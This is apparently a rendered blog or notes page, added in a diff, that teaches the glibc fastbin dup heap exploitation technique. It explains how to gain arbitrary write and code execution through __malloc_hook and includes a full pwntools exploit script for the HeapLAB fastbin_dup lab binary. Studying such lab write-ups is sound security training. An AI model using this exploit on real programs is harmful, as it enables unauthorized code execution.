@@ -1,0 +1,100 @@
+I",<p>Tricking malloc into returning an already-allocated heap pointer by abusing the fastbin freelist. This can be used to gain an arbitrary write primitive.</p>
+
+<h2 id="requirements">Requirements</h2>
+<ul>
+  <li>Allocate chunks in fastbin size, <code class="language-plaintext highlighter-rouge">0x20 - 0x80</code></li>
+  <li>Ability to free chunks in any order</li>
+  <li>Ability to forge or find fake chunk</li>
+</ul>
+
+<h2 id="process">Process</h2>
+<h3 id="arbitrary-write-primitive">Arbitrary Write Primitive</h3>
+<p><em>Assuming <code class="language-plaintext highlighter-rouge">target</code> is the address to be overwritten</em></p>
+<ul>
+  <li>Allocate 2 chunks, free them in alternating order: <code class="language-plaintext highlighter-rouge">free(1), free(0), free(1)</code>. This causes the <code class="language-plaintext highlighter-rouge">fd</code> pointer of the second chunk to link back to the first in the fastbin list.</li>
+  <li>Forge a fake chunk somehow at <code class="language-plaintext highlighter-rouge">target - 16</code>, <code class="language-plaintext highlighter-rouge">target - 8</code> must hold chunk size equal to size of previous chunks.</li>
+  <li>Allocate chunk, with <code class="language-plaintext highlighter-rouge">target - 16</code> as the data to overwrite the <code class="language-plaintext highlighter-rouge">fd</code> pointer in the fastbin list.</li>
+  <li>Allocate 2 more chunks to free up fastbin list. Last address in the fastbin list will point to the fake chunk.</li>
+  <li>Allocate chunk with data to be written to <code class="language-plaintext highlighter-rouge">target</code>.</li>
+</ul>
+
+<h3 id="gaining-rce-using-ret2libc">Gaining RCE using ret2libc</h3>
+<p><em>This requires libc version to be known</em></p>
+<ul>
+  <li>Overwrite <code class="language-plaintext highlighter-rouge">__malloc_hook</code> using write primitive with <code class="language-plaintext highlighter-rouge">one_gadget</code>
+    <ul>
+      <li>Fake chunk can be found using <code class="language-plaintext highlighter-rouge">find_fake_fast &amp;__malloc_hook</code> in <code class="language-plaintext highlighter-rouge">pwndbg</code></li>
+      <li>Chunk size of all previous chunks must be same as chunk size in this fake chunk</li>
+      <li>As chunk is not allocated with alignment, data when overwriting becomes <code class="language-plaintext highlighter-rouge">padding + one_gadget</code></li>
+    </ul>
+  </li>
+  <li>Call <code class="language-plaintext highlighter-rouge">malloc()</code></li>
+</ul>
+
+<h2 id="example-heaplab-fastbin_dup">Example: HeapLAB fastbin_dup</h2>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">config</span> <span class="o">=</span> <span class="p">{</span><span class="s">"elf"</span> <span class="p">:</span> <span class="s">"./fastbin_dup"</span><span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'data: '</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">index</span><span class="p">):</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'2'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'index: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">):</span>
+    <span class="c1"># Get puts leak
+</span>    <span class="n">ru</span><span class="p">(</span><span class="s">'puts() @ '</span><span class="p">)</span>
+    <span class="n">puts</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
+    
+    <span class="c1"># Setting random username
+</span>    <span class="n">sla</span><span class="p">(</span><span class="s">'username: '</span><span class="p">,</span> <span class="s">'JEFFJOHN'</span><span class="p">)</span>
+    
+    <span class="c1"># Calculate libc addresses
+</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'puts'</span><span class="p">]</span>
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xe1fa1</span>
+    <span class="n">malloc_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span>
+    
+    <span class="c1"># Fastbin dup
+</span>    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+
+    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+    <span class="c1"># Overwrite __malloc_hook with one_gadget 
+</span>    <span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">malloc_hook</span> <span class="o">-</span> <span class="mi">35</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">19</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+    <span class="c1"># Pop shell
+</span>    <span class="n">sla</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+    <span class="n">sla</span><span class="p">(</span><span class="s">'size: '</span><span class="p">,</span> <span class="s">'1'</span><span class="p">)</span>
+
+    <span class="n">lg</span><span class="p">(</span><span class="s">'Fake Chunk: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">fake_chunk</span><span class="p">))</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">'malloc_hook: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">malloc_hook</span><span class="p">))</span>
+    <span class="n">lg</span><span class="p">(</span><span class="s">'One_gadget: '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">config</span><span class="p">[</span><span class="s">"elf"</span><span class="p">])</span>
+    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>
+    <span class="n">pause</span><span class="p">()</span>
+
+    <span class="n">sl</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">sla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span><span class="n">b</span><span class="p">)</span>
+    <span class="n">ru</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+    <span class="n">lg</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span> <span class="p">:</span> <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
+
+    <span class="n">exploit</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+</code></pre></div></div>
+:ET
